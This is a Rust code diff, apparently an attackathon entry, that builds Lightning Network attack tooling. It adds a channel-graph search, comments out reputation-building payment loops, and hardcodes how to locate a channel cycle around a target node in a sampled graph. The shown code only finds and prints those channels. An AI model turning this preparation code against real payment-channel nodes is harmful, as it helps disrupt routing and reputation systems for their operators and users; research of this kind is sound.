@@ -155,7 +155,106 @@ async fn sleep(secs: u64) {
 	tokio::time::sleep(Duration::new(secs, 0))
 		.await;
 }
+/////////////////////////////////////////////////////////////////
 
+struct ChannelFinder {
+	edges: Vec<ChannelEdge>
+}
+#[derive(Debug)]
+struct FoundChannel {
+	channel_id: u64,
+	source: Vec<u8>,
+	dest: Vec<u8>,
+	policy: Option<RoutingPolicy>
+}
+impl ChannelFinder {
+	async fn new(client: &mut Client) -> Self {
+		let graph = client.lightning()
+			.describe_graph(ChannelGraphRequest{
+				include_unannounced: true
+			})
+			.await
+			.expect("describegraph failed")
+			.into_inner();
+		let edges = graph.edges;
+		Self{ edges }
+	}
+	fn search( &self
+		 , source_nodeid: Option<&[u8]>
+		 , dest_nodeid: Option<&[u8]>
+		 , amt: i64
+		 ) -> Option<FoundChannel> {
+		let edges = &self.edges;
+		for e in edges {
+			if e.capacity != amt {
+				continue;
+			}
+			let n1 = hex::decode(
+				&e.node1_pub
+			).expect("expected hex in node1_pub");
+			let n2 = hex::decode(
+				&e.node2_pub
+			).expect("expected hex in node1_pub");
+			match (source_nodeid, dest_nodeid) {
+				(None, None) => panic!(),
+				(Some(s), Some(d)) => {
+					if n1 == s && n2 == d {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node1_policy.clone(),
+							source: n1.clone(),
+							dest: n2.clone()
+						});
+					} else if n2 == s && n1 == d {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node2_policy.clone(),
+							source: n2.clone(),
+							dest: n1.clone()
+						});
+					}
+				},
+				(Some(s), None) => {
+					if n1 == s {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node1_policy.clone(),
+							source: n1.clone(),
+							dest: n2.clone()
+						});
+					} else if n2 == s {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node2_policy.clone(),
+							source: n2.clone(),
+							dest: n1.clone()
+						});
+					}
+				},
+				(None, Some(d)) => {
+					if n2 == d {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node1_policy.clone(),
+							source: n1.clone(),
+							dest: n2.clone()
+						});
+					} else if n1 == d {
+						return Some(FoundChannel{
+							channel_id: e.channel_id,
+							policy: e.node2_policy.clone(),
+							source: n2.clone(),
+							dest: n1.clone()
+						});
+					}
+				}
+			}
+		}
+		return None;
+	}
+}
+
+/////////////////////////////////////////////////////////////////
 #[tokio::main]
 async fn main() {
 	let mut args = std::env::args_os();
@@ -192,21 +291,79 @@ async fn main() {
 
 	/* Step 1: spend big funds from 0-> target -> 1 and back.  */
 	/* Seed client1 with some funds first.  */
-	keysend( &mut client0
-	       , &mut client1
-	       , 1000000
-	       ).await;
-	sleep(10).await;
-	for _ in 0..100 {
-		/* Swap funds back and forth to build our reputation... */
-		keysend( &mut client0
-		       , &mut client1
-		       , 1000000
-		       ).await;
-		keysend( &mut client1
-		       , &mut client0
-		       , 1000000
-		       ).await;
-		sleep(10).await;
-	}
+//	keysend( &mut client0
+//	       , &mut client1
+//	       , 1000000
+//	       ).await;
+//	sleep(10).await;
+//	for _ in 0..100 {
+//		/* Swap funds back and forth to build our reputation... */
+//		keysend( &mut client0
+//		       , &mut client1
+//		       , 1000000
+//		       ).await;
+//		keysend( &mut client1
+//		       , &mut client0
+//		       , 1000000
+//		       ).await;
+//		sleep(10).await;
+//	}
+
+	/* Step 2: attack: route through a specific route:
+	 *
+	 * client0
+	 *    |
+	 *    |
+	 * target ==bigchan=== 3
+	 *    |                |
+	 *  smallchan       medchan
+	 *    |                |
+	 *    +------- 5 ------+
+	 *
+	 * From client0, go to target, then through bigchan,
+	 * medchan, and smallchan, then back to client0.
+	 *
+	 * The thesis is that such cycles are not uncommon,
+	 * and in fact the sampled random walk ln_10 used
+	 * in the attackathon does have such a cycle around
+	 * target node (node 7): bigchan is from node 7 to
+	 * node 3, medchan is from node 3 to node 5, and
+	 * smallchan is from node 5 to 7.
+	 * We kinda semi-hardcode this here, but in a "real"
+	 * attack searching for such a cycle can be done as
+	 * part of attack preparation.
+	 */
+	const BIGCHAN_AMT   : i64 = 100000000;
+	const MEDCHAN_AMT   : i64 =   4000000;
+	const SMALLCHAN_AMT : i64 =    400000;
+	/* In the ln_10 graph, there are multiple channels
+	 * that match MEDCHAN_AMT, but only one channel
+	 * each match BIGCHAN_AMT and SMALLCHAN_AMT.
+	 * Again, while we kinda hardcode the amounts and
+	 * how we search for them, this kind of search can
+	 * be done in more sophisticated attack code than
+	 * I have time to code in one day.
+	 */
+	let finder = ChannelFinder::new(&mut client0).await;
+	let bigchan = finder.search(
+		Some(&target),
+		None,
+		BIGCHAN_AMT
+	).expect("we know this channel exists in ln_10");
+	let smallchan = finder.search(
+		None,
+		Some(&target),
+		SMALLCHAN_AMT
+	).expect("we know this channel exists in ln_10");
+	/* Find midchan as the one between bigchan.dest and
+	 * smallchan.source
+	 */
+	let medchan = finder.search(
+		Some(&bigchan.dest),
+		Some(&smallchan.source),
+		MEDCHAN_AMT
+	).expect("we know this channel exists in ln_10");
+	println!("bigchan = {:#?}", bigchan);
+	println!("medchan = {:#?}", medchan);
+	println!("smallchan = {:#?}", smallchan);
 }
